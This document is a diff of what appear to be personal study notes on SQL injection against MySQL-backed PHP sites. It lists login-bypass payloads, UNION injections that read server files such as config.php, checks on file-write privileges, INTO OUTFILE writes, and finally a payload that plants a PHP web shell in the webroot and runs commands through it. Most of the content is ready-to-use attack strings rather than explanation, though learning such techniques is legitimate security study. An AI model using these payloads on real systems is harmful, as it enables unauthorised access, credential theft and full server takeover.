@@ -4,10 +4,8 @@ SELECT * FROM logins WHERE username='admin' AND password = '47bce5c74f589f4867db
 admin') or '1'='1'-- -
 
 SELECT * FROM logins WHERE (username='admin' AND id > 1)-- - AND password = '47bce5c74f589f4867dbd57e9ca9f808';
-
 test' OR id = 5)-- -
-toma' OR id = 
-test' OR id = 4)-- -
+
 
 # dump name databases
 
@@ -98,3 +96,41 @@ all of the possible privileges given to our current user:
 	 	Another Example:
 	 		We know that the current page is index.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/index.php
 	 		UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
+			
+## Writing Files
+	When it comes to writing files to the back-end server, it becomes much more restricted in modern DMBSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.
+
+	### Write File Privileges
+		To be able to write files to the back-end server using a MySQL database, we require three things:
+		User with FILE privilege enabled
+		MySQL global secure_file_priv variable not enabled
+		Write access to the location we want to write to on the back-end server
+
+		We have already found that our current user has the FILE privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the secure_file_priv global variable.
+
+### secure_file_priv:
+
+		SHOW VARIABLES LIKE 'secure_file_priv';
+		SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+	### example:
+				' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+				look return payload in page that the secure_file_priv value is empty, meaning that we can read/write files to any location 
+
+		### SELECT INTO OUTFILE:
+
+			SELECT * from users INTO OUTFILE '/tmp/credentials';
+			SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+			select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+		### example:
+			' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+
+## Writing a Web Shell
+
+Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:		
+
+	<?php system($_REQUEST[0]); ?>
+
+	### example
+			' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+
+			https://www.website.com//shell.php?0=id
